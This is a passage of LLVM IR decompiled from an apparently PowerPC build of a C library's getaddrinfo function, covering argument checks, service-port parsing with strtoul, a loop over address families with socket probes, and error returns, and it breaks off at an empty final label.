define i32 @getaddrinfo(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 %tmp, i32* @r27, align 4
  %v4_1001d458 = icmp eq i8* %arg1, null
  store i32 0, i32* %stack_var_-104, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %arg4, i32* %r21.global-to-local, align 4
  br i1 %v4_1001d458, label %dec_label_pc_1001d494, label %dec_label_pc_1001d478

dec_label_pc_1001d478:                            ; preds = %entry
  %v2_1001d478 = load i8, i8* %arg1, align 1
  %v3_1001d47c = icmp eq i8 %v2_1001d478, 42
  store i1 %v3_1001d47c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d47c, label %dec_label_pc_1001d484, label %dec_label_pc_1001d494

dec_label_pc_1001d484:                            ; preds = %dec_label_pc_1001d478
  %v1_1001d484 = add i32 %tmp, 1
  %v2_1001d484 = inttoptr i32 %v1_1001d484 to i8*
  %v3_1001d484 = load i8, i8* %v2_1001d484, align 1
  %v4_1001d484 = zext i8 %v3_1001d484 to i32
  %v1_1001d488 = sub nsw i32 0, %v4_1001d484
  %tmp41 = icmp ne i8 %v3_1001d484, 0
  %v1_1001d48c = zext i1 %tmp41 to i32
  %v2_1001d48c = ashr i32 %v1_1001d488, 31
  %v3_1001d48c = and i32 %v2_1001d48c, -2
  %v4_1001d48c = or i32 %v3_1001d48c, %v1_1001d48c
  %v2_1001d490 = and i32 %v4_1001d48c, %tmp
  store i32 %v2_1001d490, i32* @r27, align 4
  br label %dec_label_pc_1001d494

dec_label_pc_1001d494:                            ; preds = %dec_label_pc_1001d478, %dec_label_pc_1001d484, %entry
  %v0_1001d4b8 = phi i32 [ %tmp, %entry ], [ %v2_1001d490, %dec_label_pc_1001d484 ], [ %tmp, %dec_label_pc_1001d478 ]
  %v3_1001d494 = icmp eq i32 %arg2, 0
  store i1 %v3_1001d494, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d494, label %dec_label_pc_1001d4b8, label %dec_label_pc_1001d49c

dec_label_pc_1001d49c:                            ; preds = %dec_label_pc_1001d494
  %v1_1001d49c = inttoptr i32 %arg2 to i8*
  %v2_1001d49c = load i8, i8* %v1_1001d49c, align 1
  %v3_1001d4a0 = icmp eq i8 %v2_1001d49c, 42
  store i1 %v3_1001d4a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4a0, label %dec_label_pc_1001d4a8, label %dec_label_pc_1001d4b8

dec_label_pc_1001d4a8:                            ; preds = %dec_label_pc_1001d49c
  %v1_1001d4a8 = add i32 %arg2, 1
  %v2_1001d4a8 = inttoptr i32 %v1_1001d4a8 to i8*
  %v3_1001d4a8 = load i8, i8* %v2_1001d4a8, align 1
  %v4_1001d4a8 = zext i8 %v3_1001d4a8 to i32
  %v1_1001d4ac = sub nsw i32 0, %v4_1001d4a8
  %tmp42 = icmp ne i8 %v3_1001d4a8, 0
  %v1_1001d4b0 = zext i1 %tmp42 to i32
  %v2_1001d4b0 = ashr i32 %v1_1001d4ac, 31
  %v3_1001d4b0 = and i32 %v2_1001d4b0, -2
  %v4_1001d4b0 = or i32 %v3_1001d4b0, %v1_1001d4b0
  %v2_1001d4b4 = and i32 %v4_1001d4b0, %arg2
  store i32 %v2_1001d4b4, i32* @r31, align 4
  br label %dec_label_pc_1001d4b8

dec_label_pc_1001d4b8:                            ; preds = %dec_label_pc_1001d49c, %dec_label_pc_1001d494, %dec_label_pc_1001d4a8
  %v1_1001d4b8 = phi i32 [ %arg2, %dec_label_pc_1001d49c ], [ 0, %dec_label_pc_1001d494 ], [ %v2_1001d4b4, %dec_label_pc_1001d4a8 ]
  %v2_1001d4b8 = or i32 %v1_1001d4b8, %v0_1001d4b8
  %v5_1001d4b8 = icmp eq i32 %v2_1001d4b8, 0
  br i1 %v5_1001d4b8, label %dec_label_pc_1001d720, label %dec_label_pc_1001d4c0

dec_label_pc_1001d4c0:                            ; preds = %dec_label_pc_1001d4b8
  %v3_1001d4c0 = icmp eq i32 %arg3, 0
  store i1 %v3_1001d4c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4c0, label %dec_label_pc_1001d4c8, label %dec_label_pc_1001d4dc

dec_label_pc_1001d4c8:                            ; preds = %dec_label_pc_1001d4c0
  %v2_1001d4c8 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1001d4c8, i32* @r29, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_1001d4c8, i32* @r3, align 4
  store i32 32, i32* @r5, align 4
  store i32 268555484, i32* @lr, align 4
  %v0_1001d4d8 = call i32 @__GI_memset()
  store i32 %v0_1001d4d8, i32* %r3.global-to-local, align 4
  %v0_1001d4dc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d4dc

dec_label_pc_1001d4dc:                            ; preds = %dec_label_pc_1001d4c0, %dec_label_pc_1001d4c8
  %v0_1001d4dc = phi i32 [ %arg3, %dec_label_pc_1001d4c0 ], [ %v0_1001d4dc.pre, %dec_label_pc_1001d4c8 ]
  %v1_1001d4dc = inttoptr i32 %v0_1001d4dc to i32*
  %v2_1001d4dc = load i32, i32* %v1_1001d4dc, align 4
  %v2_1001d4e4 = and i32 %v2_1001d4dc, -1088
  %v5_1001d4e4 = icmp eq i32 %v2_1001d4e4, 0
  br i1 %v5_1001d4e4, label %dec_label_pc_1001d4ec, label %dec_label_pc_1001d728

dec_label_pc_1001d4ec:                            ; preds = %dec_label_pc_1001d4dc
  %v1_1001d4ec = and i32 %v2_1001d4dc, 2
  %v3_1001d4ec = icmp eq i32 %v1_1001d4ec, 0
  br i1 %v3_1001d4ec, label %dec_label_pc_1001d4fc, label %dec_label_pc_1001d4f4

dec_label_pc_1001d4f4:                            ; preds = %dec_label_pc_1001d4ec
  %v0_1001d4f4 = load i32, i32* @r27, align 4
  %v3_1001d4f4 = icmp eq i32 %v0_1001d4f4, 0
  store i1 %v3_1001d4f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4f4, label %dec_label_pc_1001d728, label %dec_label_pc_1001d4fc

dec_label_pc_1001d4fc:                            ; preds = %dec_label_pc_1001d4f4, %dec_label_pc_1001d4ec
  %v0_1001d4fc = load i32, i32* @r31, align 4
  %v3_1001d4fc = icmp eq i32 %v0_1001d4fc, 0
  store i1 %v3_1001d4fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d4fc, label %dec_label_pc_1001d578, label %dec_label_pc_1001d504

dec_label_pc_1001d504:                            ; preds = %dec_label_pc_1001d4fc
  %v1_1001d504 = inttoptr i32 %v0_1001d4fc to i8*
  %v2_1001d504 = load i8, i8* %v1_1001d504, align 1
  %v3_1001d508 = icmp eq i8 %v2_1001d504, 0
  store i1 %v3_1001d508, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d508, label %dec_label_pc_1001d578, label %dec_label_pc_1001d510

dec_label_pc_1001d510:                            ; preds = %dec_label_pc_1001d504
  store i32 %v0_1001d4fc, i32* %r3.global-to-local, align 4
  %v2_1001d514 = ptrtoint i8** %stack_var_-100 to i32
  store i32 %v2_1001d514, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  store i32 268555556, i32* @lr, align 4
  %v4_1001d520 = call i32 @strtoul(i32 %v0_1001d4fc, i32 %v2_1001d514, i32 10)
  store i32 %v4_1001d520, i32* %r3.global-to-local, align 4
  %v3_1001d524 = load i8*, i8** %stack_var_-100, align 4
  %v2_1001d52c = load i8, i8* %v3_1001d524, align 1
  %v3_1001d530 = icmp eq i8 %v2_1001d52c, 0
  store i1 %v3_1001d530, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d554 = load i32, i32* @r29, align 4
  br i1 %v3_1001d530, label %dec_label_pc_1001d554, label %dec_label_pc_1001d538

dec_label_pc_1001d538:                            ; preds = %dec_label_pc_1001d510
  %v1_1001d538 = inttoptr i32 %v0_1001d554 to i32*
  %v2_1001d538 = load i32, i32* %v1_1001d538, align 4
  %v1_1001d53c = and i32 %v2_1001d538, 1024
  %v3_1001d53c = icmp eq i32 %v1_1001d53c, 0
  br i1 %v3_1001d53c, label %dec_label_pc_1001d544, label %dec_label_pc_1001d720

dec_label_pc_1001d544:                            ; preds = %dec_label_pc_1001d538
  br label %dec_label_pc_1001d57c

dec_label_pc_1001d554:                            ; preds = %dec_label_pc_1001d510
  %v1_1001d554 = add i32 %v0_1001d554, 8
  %v2_1001d554 = inttoptr i32 %v1_1001d554 to i32*
  %v3_1001d554 = load i32, i32* %v2_1001d554, align 4
  %v3_1001d558 = icmp eq i32 %v3_1001d554, 0
  store i1 %v3_1001d558, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d558, label %dec_label_pc_1001d560, label %dec_label_pc_1001d570

dec_label_pc_1001d560:                            ; preds = %dec_label_pc_1001d554
  %v1_1001d560 = add i32 %v0_1001d554, 12
  %v2_1001d560 = inttoptr i32 %v1_1001d560 to i32*
  %v3_1001d560 = load i32, i32* %v2_1001d560, align 4
  store i32 -8, i32* %r3.global-to-local, align 4
  %v3_1001d568 = icmp eq i32 %v3_1001d560, 0
  store i1 %v3_1001d568, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d568, label %dec_label_pc_1001d72c, label %dec_label_pc_1001d570

dec_label_pc_1001d570:                            ; preds = %dec_label_pc_1001d554, %dec_label_pc_1001d560
  br label %dec_label_pc_1001d57c

dec_label_pc_1001d578:                            ; preds = %dec_label_pc_1001d504, %dec_label_pc_1001d4fc
  br label %dec_label_pc_1001d57c

dec_label_pc_1001d57c:                            ; preds = %dec_label_pc_1001d570, %dec_label_pc_1001d544, %dec_label_pc_1001d578
  %v0_1001d5a420 = phi i32 [ %v0_1001d554, %dec_label_pc_1001d570 ], [ %v0_1001d554, %dec_label_pc_1001d544 ], [ %v0_1001d4dc, %dec_label_pc_1001d578 ]
  %v0_1001d57c = load i32, i32* %r21.global-to-local, align 4
  %v3_1001d57c = icmp eq i32 %v0_1001d57c, 0
  %v2_1001d588 = ptrtoint i32* %stack_var_-104 to i32
  %.v2_1001d588 = select i1 %v3_1001d57c, i32 0, i32 %v2_1001d588
  store i32 %.v2_1001d588, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r22.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f00c.1193 to i32), i32* %r28.global-to-local, align 4
  store i32 0, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v3_1001d6cc12 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1002f00c.1193 to i32), i32 4) to i32*), align 4
  %v3_1001d6d015 = icmp eq i32 %v3_1001d6cc12, 0
  store i1 %v3_1001d6d015, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6d015, label %dec_label_pc_1001d6d8, label %dec_label_pc_1001d5a4

dec_label_pc_1001d5a4:                            ; preds = %dec_label_pc_1001d57c, %dec_label_pc_1001d6cc.backedge.dec_label_pc_1001d5a4_crit_edge
  %v0_1001d5a8 = phi i32 [ %v0_1001d6cc, %dec_label_pc_1001d6cc.backedge.dec_label_pc_1001d5a4_crit_edge ], [ ptrtoint (i32* @global_var_1002f00c.1193 to i32), %dec_label_pc_1001d57c ]
  %v0_1001d5bc = phi i32 [ %v0_1001d5a4.pre, %dec_label_pc_1001d6cc.backedge.dec_label_pc_1001d5a4_crit_edge ], [ %v0_1001d5a420, %dec_label_pc_1001d57c ]
  %v1_1001d5a4 = add i32 %v0_1001d5bc, 4
  %v2_1001d5a4 = inttoptr i32 %v1_1001d5a4 to i32*
  %v3_1001d5a4 = load i32, i32* %v2_1001d5a4, align 4
  %v1_1001d5a8 = inttoptr i32 %v0_1001d5a8 to i32*
  %v2_1001d5a8 = load i32, i32* %v1_1001d5a8, align 4
  store i32 %v2_1001d5a8, i32* %r3.global-to-local, align 4
  %v4_1001d5ac = icmp eq i32 %v3_1001d5a4, %v2_1001d5a8
  store i1 %v4_1001d5ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001d5ac, label %dec_label_pc_1001d5bc, label %dec_label_pc_1001d5b4

dec_label_pc_1001d5b4:                            ; preds = %dec_label_pc_1001d5a4
  %v3_1001d5b4 = icmp eq i32 %v3_1001d5a4, 0
  store i1 %v3_1001d5b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d5b4, label %dec_label_pc_1001d5bc, label %dec_label_pc_1001d6c8

dec_label_pc_1001d5bc:                            ; preds = %dec_label_pc_1001d5b4, %dec_label_pc_1001d5a4
  %v1_1001d5bc = inttoptr i32 %v0_1001d5bc to i32*
  %v2_1001d5bc = load i32, i32* %v1_1001d5bc, align 4
  %v1_1001d5c0 = and i32 %v2_1001d5bc, 32
  %v3_1001d5c0 = icmp eq i32 %v1_1001d5c0, 0
  br i1 %v3_1001d5c0, label %dec_label_pc_1001d62c, label %dec_label_pc_1001d5c8

dec_label_pc_1001d5c8:                            ; preds = %dec_label_pc_1001d5bc
  %v1_1001d5c8 = urem i32 %v2_1001d5a8, 65536
  store i32 %v1_1001d5c8, i32* @r31, align 4
  %v0_1001d5cc = call i32 @__errno_location()
  store i32 %v0_1001d5cc, i32* %r3.global-to-local, align 4
  %v0_1001d5d0 = load i32, i32* @r31, align 4
  %v3_1001d5d0 = icmp eq i32 %v0_1001d5d0, 2
  store i1 %v3_1001d5d0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1001d5cc, i32* %r30.global-to-local, align 4
  %v1_1001d5d8 = inttoptr i32 %v0_1001d5cc to i32*
  %v2_1001d5d8 = load i32, i32* %v1_1001d5d8, align 4
  store i32 %v2_1001d5d8, i32* %r25.global-to-local, align 4
  br i1 %v3_1001d5d0, label %dec_label_pc_1001d61c, label %dec_label_pc_1001d5e0

dec_label_pc_1001d5e0:                            ; preds = %dec_label_pc_1001d5c8
  %v3_1001d5e0 = icmp eq i32 %v0_1001d5d0, 10
  store i1 %v3_1001d5e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d5e0, label %dec_label_pc_1001d620, label %dec_label_pc_1001d5ec

dec_label_pc_1001d5ec:                            ; preds = %dec_label_pc_1001d5e0
  store i32 %v0_1001d5d0, i32* %r3.global-to-local, align 4
  store i32 268555772, i32* @lr, align 4
  %v3_1001d5f8 = call i32 @socket(i32 %v0_1001d5d0, i32 2, i32 0)
  store i32 %v3_1001d5f8, i32* %r3.global-to-local, align 4
  %v3_1001d5fc = icmp eq i32 %v3_1001d5f8, 0
  store i1 %v3_1001d5fc, i1* %cr7_eq.global-to-local, align 1
  %tmp40 = icmp sgt i32 %v3_1001d5f8, -1
  br i1 %tmp40, label %dec_label_pc_1001d618, label %dec_label_pc_1001d604

dec_label_pc_1001d604:                            ; preds = %dec_label_pc_1001d5ec
  %v0_1001d604 = load i32, i32* %r30.global-to-local, align 4
  %v1_1001d604 = inttoptr i32 %v0_1001d604 to i32*
  %v2_1001d604 = load i32, i32* %v1_1001d604, align 4
  %v3_1001d60c = icmp eq i32 %v2_1001d604, 24
  store i1 %v3_1001d60c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d60c, label %dec_label_pc_1001d61c, label %dec_label_pc_1001d620

dec_label_pc_1001d618:                            ; preds = %dec_label_pc_1001d5ec
  store i32 ptrtoint ([3 x i8]* @global_var_1001d61c.1194 to i32), i32* @lr, align 4
  %v1_1001d618 = call i32 @__libc_close(i32 %v3_1001d5f8)
  store i32 %v1_1001d618, i32* %r3.global-to-local, align 4
  %v1_1001d624.pre.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d61c

dec_label_pc_1001d61c:                            ; preds = %dec_label_pc_1001d604, %dec_label_pc_1001d5c8, %dec_label_pc_1001d618
  %v1_1001d624.pre = phi i32 [ %v0_1001d604, %dec_label_pc_1001d604 ], [ %v0_1001d5cc, %dec_label_pc_1001d5c8 ], [ %v1_1001d624.pre.pre, %dec_label_pc_1001d618 ]
  br label %dec_label_pc_1001d620

dec_label_pc_1001d620:                            ; preds = %dec_label_pc_1001d604, %dec_label_pc_1001d5e0, %dec_label_pc_1001d61c
  %v1_1001d624 = phi i32 [ %v0_1001d5cc, %dec_label_pc_1001d5e0 ], [ %v1_1001d624.pre, %dec_label_pc_1001d61c ], [ %v0_1001d604, %dec_label_pc_1001d604 ]
  %v0_1001d620 = phi i1 [ false, %dec_label_pc_1001d5e0 ], [ false, %dec_label_pc_1001d61c ], [ true, %dec_label_pc_1001d604 ]
  store i1 %v0_1001d620, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d624 = load i32, i32* %r25.global-to-local, align 4
  %v2_1001d624 = inttoptr i32 %v1_1001d624 to i32*
  store i32 %v0_1001d624, i32* %v2_1001d624, align 4
  br i1 %v0_1001d620, label %dec_label_pc_1001d620.dec_label_pc_1001d6c8_crit_edge, label %dec_label_pc_1001d62c

dec_label_pc_1001d620.dec_label_pc_1001d6c8_crit_edge: ; preds = %dec_label_pc_1001d620
  %v0_1001d6c8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d6c8

dec_label_pc_1001d62c:                            ; preds = %dec_label_pc_1001d620, %dec_label_pc_1001d5bc
  %v0_1001d62c = load i32, i32* %r26.global-to-local, align 4
  %v3_1001d62c = icmp eq i32 %v0_1001d62c, 0
  store i1 %v3_1001d62c, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d630 = load i32, i32* %r22.global-to-local, align 4
  %v1_1001d630 = add i32 %v0_1001d630, 1
  store i32 %v1_1001d630, i32* %r22.global-to-local, align 4
  br i1 %v3_1001d62c, label %dec_label_pc_1001d62c.dec_label_pc_1001d648_crit_edge, label %dec_label_pc_1001d638

dec_label_pc_1001d62c.dec_label_pc_1001d648_crit_edge: ; preds = %dec_label_pc_1001d62c
  %v0_1001d648.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d648

dec_label_pc_1001d638:                            ; preds = %dec_label_pc_1001d62c
  %v1_1001d638 = add i32 %v0_1001d62c, 4
  %v2_1001d638 = inttoptr i32 %v1_1001d638 to i32*
  %v3_1001d638 = load i32, i32* %v2_1001d638, align 4
  %v0_1001d63c = load i32, i32* %r28.global-to-local, align 4
  %v1_1001d63c = add i32 %v0_1001d63c, 4
  %v2_1001d63c = inttoptr i32 %v1_1001d63c to i32*
  %v3_1001d63c = load i32, i32* %v2_1001d63c, align 4
  %v4_1001d640 = icmp eq i32 %v3_1001d638, %v3_1001d63c
  store i1 %v4_1001d640, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001d640, label %dec_label_pc_1001d6c8, label %dec_label_pc_1001d648

dec_label_pc_1001d648:                            ; preds = %dec_label_pc_1001d62c.dec_label_pc_1001d648_crit_edge, %dec_label_pc_1001d638
  %v0_1001d648 = phi i32 [ %v0_1001d648.pre, %dec_label_pc_1001d62c.dec_label_pc_1001d648_crit_edge ], [ %v0_1001d63c, %dec_label_pc_1001d638 ]
  %v1_1001d648 = add i32 %v0_1001d648, 4
  %v2_1001d648 = inttoptr i32 %v1_1001d648 to i32*
  %v3_1001d648 = load i32, i32* %v2_1001d648, align 4
  %v0_1001d64c = load i32, i32* @r27, align 4
  store i32 %v0_1001d64c, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1001d648)
  %v0_1001d664 = load i32, i32* %r3.global-to-local, align 4
  %v4_1001d664 = icmp eq i32 %v0_1001d664, 0
  br i1 %v4_1001d664, label %dec_label_pc_1001d6a8, label %dec_label_pc_1001d66c

dec_label_pc_1001d66c:                            ; preds = %dec_label_pc_1001d648
  %v0_1001d66c = load i32, i32* @r29, align 4
  %v1_1001d66c = add i32 %v0_1001d66c, 4
  %v2_1001d66c = inttoptr i32 %v1_1001d66c to i32*
  %v3_1001d66c = load i32, i32* %v2_1001d66c, align 4
  %v3_1001d670 = icmp eq i32 %v3_1001d66c, 0
  store i1 %v3_1001d670, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d670, label %dec_label_pc_1001d678, label %dec_label_pc_1001d68c

dec_label_pc_1001d678:                            ; preds = %dec_label_pc_1001d66c
  %v2_1001d678 = and i32 %v0_1001d664, 256
  %v4_1001d678 = icmp eq i32 %v2_1001d678, 0
  br i1 %v4_1001d678, label %dec_label_pc_1001d68c, label %dec_label_pc_1001d680

dec_label_pc_1001d680:                            ; preds = %dec_label_pc_1001d678
  store i32 %v0_1001d664, i32* %r23.global-to-local, align 4
  %v0_1001d684 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001d684, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001d6cc.backedge

dec_label_pc_1001d68c:                            ; preds = %dec_label_pc_1001d66c, %dec_label_pc_1001d678
  %v3_1001d68c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001d68c, i32* %r3.global-to-local, align 4
  %v3_1001d690 = icmp eq i32 %v3_1001d68c, 0
  store i1 %v3_1001d690, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d690, label %dec_label_pc_1001d69c, label %dec_label_pc_1001d698

dec_label_pc_1001d698:                            ; preds = %dec_label_pc_1001d68c
  store i32 268555932, i32* @lr, align 4
  %v1_1001d698 = call i32 @freeaddrinfo(i32 %v3_1001d68c)
  store i32 %v1_1001d698, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d69c

dec_label_pc_1001d69c:                            ; preds = %dec_label_pc_1001d68c, %dec_label_pc_1001d698
  %v2_1001d69c = call i32 @__asm_rlwinm(i32 %v0_1001d664, i32 0, i32 24, i32 22)
  %v1_1001d6a0 = sub i32 0, %v2_1001d69c
  store i32 %v1_1001d6a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d72c

dec_label_pc_1001d6a8:                            ; preds = %dec_label_pc_1001d648
  %v0_1001d6a8 = load i32, i32* %r24.global-to-local, align 4
  %v3_1001d6a8 = icmp eq i32 %v0_1001d6a8, 0
  store i1 %v3_1001d6a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6a8, label %dec_label_pc_1001d6c4, label %dec_label_pc_1001d6b8.preheader

dec_label_pc_1001d6b8.preheader:                  ; preds = %dec_label_pc_1001d6a8
  %v1_1001d6b84 = inttoptr i32 %v0_1001d6a8 to i32*
  %v2_1001d6b85 = load i32, i32* %v1_1001d6b84, align 4
  %v3_1001d6bc8 = icmp eq i32 %v2_1001d6b85, 0
  store i1 %v3_1001d6bc8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6bc8, label %dec_label_pc_1001d6c4, label %dec_label_pc_1001d6b4

dec_label_pc_1001d6b4:                            ; preds = %dec_label_pc_1001d6b8.preheader, %dec_label_pc_1001d6b4
  %v0_1001d6b4 = phi i32 [ %v2_1001d6b8, %dec_label_pc_1001d6b4 ], [ %v2_1001d6b85, %dec_label_pc_1001d6b8.preheader ]
  %v1_1001d6b4 = add i32 %v0_1001d6b4, 28
  store i32 %v1_1001d6b4, i32* %r24.global-to-local, align 4
  %v1_1001d6b8 = inttoptr i32 %v1_1001d6b4 to i32*
  %v2_1001d6b8 = load i32, i32* %v1_1001d6b8, align 4
  %v3_1001d6bc = icmp eq i32 %v2_1001d6b8, 0
  br i1 %v3_1001d6bc, label %dec_label_pc_1001d6b8.dec_label_pc_1001d6c4.loopexit_crit_edge, label %dec_label_pc_1001d6b4

dec_label_pc_1001d6b8.dec_label_pc_1001d6c4.loopexit_crit_edge: ; preds = %dec_label_pc_1001d6b4
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001d6c4

dec_label_pc_1001d6c4:                            ; preds = %dec_label_pc_1001d6b8.preheader, %dec_label_pc_1001d6b8.dec_label_pc_1001d6c4.loopexit_crit_edge, %dec_label_pc_1001d6a8
  %v0_1001d6c4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1001d6c4, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001d6c8

dec_label_pc_1001d6c8:                            ; preds = %dec_label_pc_1001d620.dec_label_pc_1001d6c8_crit_edge, %dec_label_pc_1001d5b4, %dec_label_pc_1001d638, %dec_label_pc_1001d6c4
  %v0_1001d6c8 = phi i32 [ %v0_1001d6c8.pre, %dec_label_pc_1001d620.dec_label_pc_1001d6c8_crit_edge ], [ %v0_1001d5a8, %dec_label_pc_1001d5b4 ], [ %v0_1001d63c, %dec_label_pc_1001d638 ], [ %v0_1001d6c4, %dec_label_pc_1001d6c4 ]
  %v1_1001d6c8 = add i32 %v0_1001d6c8, 8
  store i32 %v1_1001d6c8, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001d6cc.backedge

dec_label_pc_1001d6cc.backedge:                   ; preds = %dec_label_pc_1001d6c8, %dec_label_pc_1001d680
  %v0_1001d6cc = phi i32 [ %v1_1001d6c8, %dec_label_pc_1001d6c8 ], [ %v0_1001d684, %dec_label_pc_1001d680 ]
  %v1_1001d6cc = add i32 %v0_1001d6cc, 4
  %v2_1001d6cc = inttoptr i32 %v1_1001d6cc to i32*
  %v3_1001d6cc = load i32, i32* %v2_1001d6cc, align 4
  %v3_1001d6d0 = icmp eq i32 %v3_1001d6cc, 0
  store i1 %v3_1001d6d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6d0, label %dec_label_pc_1001d6cc.dec_label_pc_1001d6d8_crit_edge, label %dec_label_pc_1001d6cc.backedge.dec_label_pc_1001d5a4_crit_edge

dec_label_pc_1001d6cc.backedge.dec_label_pc_1001d5a4_crit_edge: ; preds = %dec_label_pc_1001d6cc.backedge
  %v0_1001d5a4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d5a4

dec_label_pc_1001d6cc.dec_label_pc_1001d6d8_crit_edge: ; preds = %dec_label_pc_1001d6cc.backedge
  %v0_1001d6d8.pre = load i32, i32* %r22.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_1001d6d8.pre, 0
  br label %dec_label_pc_1001d6d8

dec_label_pc_1001d6d8:                            ; preds = %dec_label_pc_1001d6cc.dec_label_pc_1001d6d8_crit_edge, %dec_label_pc_1001d57c
  %v0_1001d6d8 = phi i1 [ %phitmp, %dec_label_pc_1001d6cc.dec_label_pc_1001d6d8_crit_edge ], [ true, %dec_label_pc_1001d57c ]
  store i1 %v0_1001d6d8, i1* %cr7_eq.global-to-local, align 1
  store i32 -6, i32* %r3.global-to-local, align 4
  br i1 %v0_1001d6d8, label %dec_label_pc_1001d72c, label %dec_label_pc_1001d6e4

dec_label_pc_1001d6e4:                            ; preds = %dec_label_pc_1001d6d8
  %v3_1001d6e4 = load i32, i32* %stack_var_-104, align 4
  %v3_1001d6e8 = icmp eq i32 %v3_1001d6e4, 0
  store i1 %v3_1001d6e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001d6e8, label %dec_label_pc_1001d6fc, label %dec_label_pc_1001d6f0

dec_label_pc_1001d6f0:                            ; preds = %dec_label_pc_1001d6e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001d6f4 = load i32, i32* %r21.global-to-local, align 4
  %v2_1001d6f4 = inttoptr i32 %v1_1001d6f4 to i32*
  store i32 %v3_1001d6e4, i32* %v2_1001d6f4, align 4
  %v0_1001d73c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d72c

dec_label_pc_1001d6fc:                            ; preds = %dec_label_pc_1001d6e4
  %v0_1001d6fc = load i32, i32* %r21.global-to-local, align 4
  %v3_1001d6fc = icmp eq i32 %v0_1001d6fc, 0
  store i1 %v3_1001d6fc, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d704 = load i32, i32* %r23.global-to-local, align 4
  br i1 %v3_1001d6fc, label %dec_label_pc_1001d704, label %dec_label_pc_1001d710

dec_label_pc_1001d704:                            ; preds = %dec_label_pc_1001d6fc
  %v3_1001d704 = icmp eq i32 %v0_1001d704, 0
  store i1 %v3_1001d704, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001d704, label %dec_label_pc_1001d72c, label %dec_label_pc_1001d710

dec_label_pc_1001d710:                            ; preds = %dec_label_pc_1001d6fc, %dec_label_pc_1001d704
  %v3_1001d710 = icmp eq i32 %v0_1001d704, 0
  store i1 %v3_1001d710, i1* %cr7_eq.global-to-local, align 1
  %v1_1001d714 = call i32 @__asm_rlwinm(i32 %v0_1001d704, i32 0, i32 24, i32 22)
  %v1_1001d718 = sub i32 0, %v1_1001d714
  store i32 %v1_1001d718, i32* %r3.global-to-local, align 4
  %v0_1001d71c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001d71c, label %dec_label_pc_1001d720, label %dec_label_pc_1001d72c

dec_label_pc_1001d720:                            ; preds = %dec_label_pc_1001d710, %dec_label_pc_1001d538, %dec_label_pc_1001d4b8
  store i32 -2, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d72c

dec_label_pc_1001d728:                            ; preds = %dec_label_pc_1001d4dc, %dec_label_pc_1001d4f4
